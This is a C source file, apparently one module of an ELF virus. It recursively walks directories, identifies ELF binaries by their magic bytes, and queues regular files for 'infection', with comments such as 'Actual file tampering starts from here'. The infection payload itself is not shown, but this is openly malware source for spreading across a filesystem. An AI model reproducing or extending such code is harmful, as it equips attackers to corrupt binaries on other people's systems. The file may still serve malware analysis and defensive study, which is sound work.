// Author : Abhinav Thakur
// Email  : compilepeace@gmail.com

// Description : This module contains all the operations that are being performed on directories


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <time.h>


#include "color.h"

#include "operations.h"



unsigned long int dir_count = 0;
unsigned long int file_count = 0;


void DirEntriesParse(char *location)
{

	struct dirent *dp;
	struct stat   statbuf;
	int status;
	
	
	status = lstat(location, &statbuf);

	if ( S_ISREG(statbuf.st_mode) )
	{
		// Infect a file
		fprintf(stdout, "\n\n");
		++file_count;
		if ( IsELF(location) )
		{
		    ++elf_count;
            ElfParser(location);
        }
		
		INFECT_DIRS = 0;				// Don't infect child directories reccursively
		return;
	}

    if ( S_ISDIR(statbuf.st_mode) )
	{
		// open up directory
	    DIR *dirptr = opendir(location);
		if ( dirptr == NULL )
		{
			perror(RED"[-]"YELLOW" 2_dir_operations.c:"RESET" While 'DirEntriesParse' in opendir(): ");
			exit(0x30);		
		}

	
		INFECT_DIRS = 1;			// Reccursively infect directories now

	    // Read directory entries reccursively until end of directory entries
	    while ( (dp = readdir(dirptr)) != NULL)
	    {
	
			// get filetype of this particular directory entry
			const char *filetype = GetFileType( GetAbsPath(location, dp->d_name) );			
	
	
			// If entry is a "Regular file", store it in a linked list
			if ( strncmp(filetype, "Regular file", 12) == 0 )
			{
				++file_count;
				char *filename = GetAbsPath(location, dp->d_name);
	
				// Create and add the filename node to 'Files' linked list
				// Actual file tampering starts from here
				if ( strncmp(filename, "/proc/", 6) != 0 && strncmp(filename, "/sys/kernel/debug/", 18) !=0)
					FileCreateNode(filename);
			}

	
			// If entry is a "Directory" parse again
			if ( strncmp(filetype, "Directory", 9) == 0 )
			{
				// buffer to pass on absolute path for next directory parsing
				char temp_buffer[1000];	
			
	
				// Ignore current and parent directory		
				if ( strcmp(dp->d_name, "." ) == 0 || strncmp(dp->d_name, "..", 2) == 0 )
					continue;


	            // keep track of how many directories have been parsed
	            ++dir_count;

		
				// Reccursively parse this directory location	
				char *dirpath = GetAbsPath(location, dp->d_name);
				DirEntriesParse( dirpath );
			}
		}


		// Prevent resource leak
    	closedir(dirptr);
	}

}


static int IsELF(char *file)
{

    // Open file in read mode
    int fd = open(file, O_RDONLY);
    if (fd == -1) return 2;


    // Read Magic bytes (first 4 bytes of file) - 0x7f 0x45 0x4c 0x46
    char magic[4];
    int bytes_read = read(fd, magic, 4);
    if (bytes_read != 4 )
    {
        close(fd);
        return 0;
    }


    // MAGIC_ELF defined in <operations.h>
    if (strncmp(magic, MAGIC_ELF, 4) != 0)
    {
        close(fd);
        return 0;
    }


    // Prevent resource leakage
    close(fd);
    return 1;
}

